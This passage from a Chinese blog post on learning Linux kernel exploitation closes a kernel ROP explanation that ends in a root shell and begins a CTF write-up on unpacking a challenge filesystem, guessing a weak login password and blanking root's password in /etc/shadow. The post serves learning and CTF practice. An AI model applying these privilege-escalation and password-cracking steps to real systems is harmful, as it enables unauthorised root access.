                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250118003618379.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250118003632606.png"
                      class=""
                >
<p>而<strong>popfq</strong>会把栈上弹出一个内容复制给e/rflags寄存器，先后对比如下。但这个并不重要，因为后面的ireq还会恢复e/rflags寄存器，所以这里的<strong>popfq</strong>只是gadget中<strong>swapgs</strong>的副作用。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250118004009402.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250118004050999.png"
                      class=""
                >
<p>而<strong>iretq</strong>则相当于先返回到当前栈顶地址处（用户态空间），然后依次从栈上弹出4个内容赋给cs，e/rflags，sp，以及ss。我们在函数一开始调用<strong>save_status</strong>就是为了这时候还原。</p>
<p>然后我们就返回了root权限的shell，要测试提权是否成功，我们现在回到init中把<code>setsid /bin/cttyhack setuidgid 0 /bin/sh</code>中的0改回1000，然后重新打包并启动，运行exp看看效果。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250118005531726.png"
                      class=""
                >
<p>成功提权。</p>
<h5 id="dsbctf-easykernel">DSBCTF-EasyKernel</h5>
<p>给了3个文件。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250119171402051.png"
                      class=""
                >
<p>先解压文件系统。然后在run.sh中加入<code>-s</code>启用gdb调试。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idmv &lt; rootfs.cpio</span><br></pre></td></tr></table></figure></div>
<p>这里我们缺vmlinux，可以用源码中的extract-vmlinux脚本来从bzImage中提取vmlinux。然后再用vmlinux-to-elf
工具恢复符号表。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/mnt/e/ctf/kernel/linux-5.15.153/scripts/extract-vmlinux ./bzImage&gt; vmlinux</span><br><span class="line">vmlinux-to-elf ./vmlinux ./vmlinux_</span><br></pre></td></tr></table></figure></div>
<p>尝试启动时发现不是进入shell环境，而是要求进行登录。实际上，我们通过查看解压出的文件系统，可以发现/etc/inittab这个文件。这说明系统使用getty进行登录。我们通过查看etc/passwd文件的内容，很容易就能得到用户名为ctfshow，而密码加密后存在etc/shadow里，这个我们一般猜不到，这里我们尝试弱口令爆破，得到密码就为<strong>ctfshow</strong>，之后就能进入shell环境。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250119180323832.png"
                      class=""
                >
<p>因为这题采用的是登录式，我们如果想要以root权限登录方便调试，就要先改/etc/shadow文件的root密码。这里我们直接清空这个root用户的密码。即改成<code>root::::::::</code>。之后我们用ctfshow用户登录进去后，就可以自由切换到root用户。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250120000054782.png"
                      class=""
                >
<p>对于run.sh以及init文件的分析在上文已经作为例子提及了，这里直接看提供的模块<strong>ctfshow.ko</strong>。</p>
<p>首先看<strong>init_module</strong>，注册了kqueue这个设备，之后可以靠kqueue_ioctl来进行交互。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250119172615036.png"
                      class=""
                >
<h4 id="参考资料">参考资料</h4>
<p>https://ctf-wiki.org/pwn/linux/kernel-mode/basic-knowledge/</p>
<p>https://sky123.blog.csdn.net/article/details/130815994?sharetype=blogdetail&amp;sharerId=130815994&amp;sharerefer=WAP&amp;sharesource=</p>
<p>https://blog.csdn.net/qq_45323960/article/details/130815994</p>

		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>标题:</strong> kernel pwn初探</li>
        <li><strong>作者:</strong> collectcrop</li>
        <li><strong>创建于
                :</strong> 2025-02-22 15:53:03</li>
        
            <li>
                <strong>更新于
                    :</strong> 2025-02-22 15:53:04
            </li>
        
        <li>
            <strong>链接:</strong> https://collectcrop.github.io/2025/02/22/kernel-pwn初探/
        </li>
        <li>
            <strong>
                版权声明:
            </strong>
            

            
                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/blog/tags/pwn/">#pwn</a>&nbsp;
			</li>
			
			<li class="tag-item mx-0.5">
				<a href="/blog/tags/kernel/">#kernel</a>&nbsp;
			</li>
			
		</ul>
		

		
  <div class="recommended-article px-2 sm:px-6 md:px-8">
   <div class="recommended-desktop">
    <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
     <i aria-hidden="true"></i><span>推荐阅读</span>
    </div>
    <div class="recommended-article-group"><a class="recommended-article-item" href="/blog/2025/03/09/ret2usr利用手法以及常见保护机制绕过浅析/" title="ret2usr利用手法以及常见保护机制绕过浅析" rel="bookmark">
  <img src="/images/wallhaven-wqery6-light.webp" alt="ret2usr利用手法以及常见保护机制绕过浅析" class="!max-w-none">
  <span class="title">ret2usr利用手法以及常见保护机制绕过浅析</span>
</a><a class="recommended-article-item" href="/blog/2025/03/09/ret2dir手法学习/" title="ret2dir手法学习" rel="bookmark">
  <img src="/images/wallhaven-wqery6-light.webp" alt="ret2dir手法学习" class="!max-w-none">
  <span class="title">ret2dir手法学习</span>
</a><a class="recommended-article-item" href="/blog/2025/03/15/Algorithmica-HPC研读记录2/" title="Algorithmica-HPC研读记录2" rel="bookmark">
  <img src="/images/wallhaven-wqery6-light.webp" alt="Algorithmica-HPC研读记录2" class="!max-w-none">
  <span class="title">Algorithmica-HPC研读记录2</span>
</a></div>
   </div>
   <div class="recommended-mobile">
   <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
     <i aria-hidden="true"></i><span>推荐阅读</span>
   </div>
   <div class="recommended-article-group"><a class="recommended-article-item" href="/blog/2025/03/09/ret2usr利用手法以及常见保护机制绕过浅析/" title="ret2usr利用手法以及常见保护机制绕过浅析" rel="bookmark">
  <img src="/images/wallhaven-wqery6-light.webp" alt="ret2usr利用手法以及常见保护机制绕过浅析" class="!max-w-none">
  <span class="title">ret2usr利用手法以及常见保护机制绕过浅析</span>
</a><a class="recommended-article-item" href="/blog/2025/03/09/ret2dir手法学习/" title="ret2dir手法学习" rel="bookmark">
  <img src="/images/wallhaven-wqery6-light.webp" alt="ret2dir手法学习" class="!max-w-none">
  <span class="title">ret2dir手法学习</span>
</a></div>
   </div>
  </div>

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">ret2usr利用手法以及常见保护机制绕过浅析</span>
						<span class="post-nav-item">上一篇</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">C#开发windows程序学习记录</span>
						<span class="post-nav-item">下一篇</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">目录</div>
		<div class="page-title">kernel pwn初探</div>
		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#kernel-pwn%E5%88%9D%E6%8E%A2"><span class="nav-text">kernel pwn初探</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3%E5%86%85%E6%A0%B8"><span class="nav-text">如何理解内核</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%86%E7%BA%A7%E4%BF%9D%E6%8A%A4%E5%9F%9F"><span class="nav-text">分级保护域</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%8A%B6%E6%80%81%E5%88%87%E6%8D%A2"><span class="nav-text">状态切换</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E5%88%86%E5%B8%83"><span class="nav-text">虚拟内存分布</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BF%9B%E7%A8%8B%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86"><span class="nav-text">进程权限管理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%AF%E8%A3%85%E8%BD%BD%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97"><span class="nav-text">可装载内核模块</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E4%BA%A4%E4%BA%92"><span class="nav-text">内核交互</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD%E5%86%85%E6%A0%B8"><span class="nav-text">下载内核</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8"><span class="nav-text">编译内核</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E9%A9%B1%E5%8A%A8"><span class="nav-text">编译内核驱动</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%BC%96%E5%86%99%E4%BB%A3%E7%A0%81"><span class="nav-text">编写代码</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%8A%A0%E8%BD%BD%E6%A8%A1%E5%9D%97"><span class="nav-text">加载模块</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%90%E4%BE%9B%E7%8E%AF%E5%A2%83"><span class="nav-text">题目提供环境</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85"><span class="nav-text">工具安装</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#vmlinux-to-elf"><span class="nav-text">vmlinux-to-elf</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ropper"><span class="nav-text">ropper</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#extract-vmlinux"><span class="nav-text">extract-vmlinux</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#gdb%E8%B0%83%E8%AF%95"><span class="nav-text">gdb调试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95"><span class="nav-text">基础利用手法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#kernel-rop"><span class="nav-text">kernel ROP</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0"><span class="nav-text">题目复现</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2018---core"><span class="nav-text">强网杯 2018 - core</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#dsbctf-easykernel"><span class="nav-text">DSBCTF-EasyKernel</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">参考资料</span></a></li></ol></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/blog/">collectcrop</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        共撰写了 22 篇文章
                    </span>
                    
                        <span>
                            共 118.7k 字
                        </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">访问人数</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">总访问量</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.1</a></span>
        </div>
        
        
            <div>
                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	

</main>



<script src="/blog/build/js/libs/Swup.min.js"></script>

<script src="/blog/build/js/libs/SwupSlideTheme.min.js"></script>

<script src="/blog/build/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/blog/build/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/blog/build/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/blog/build/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/blog/build/js/tools/imageViewer.js" type="module"></script>

<script src="/blog/build/js/utils.js" type="module"></script>

<script src="/blog/build/js/main.js" type="module"></script>

<script src="/blog/build/js/layouts/navbarShrink.js" type="module"></script>

<script src="/blog/build/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/blog/build/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/blog/build/js/layouts/categoryList.js" type="module"></script>





    
<script src="/blog/build/js/tools/codeBlock.js" type="module"></script>




    
<script src="/blog/build/js/layouts/lazyload.js" type="module"></script>




    
<script src="/blog/build/js/tools/runtime.js"></script>

    
<script src="/blog/build/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/blog/assets/odometer-theme-minimal.css">




  
<script src="/blog/build/js/libs/Typed.min.js"></script>

  
<script src="/blog/build/js/plugins/typed.js" type="module"></script>











    
<script src="/blog/build/js/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/blog/build/js/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/blog/build/js/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/blog/build/js/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/blog/build/js/layouts/essays.js" type="module" data-swup-reload-script=""></script>





	
</body>

</html>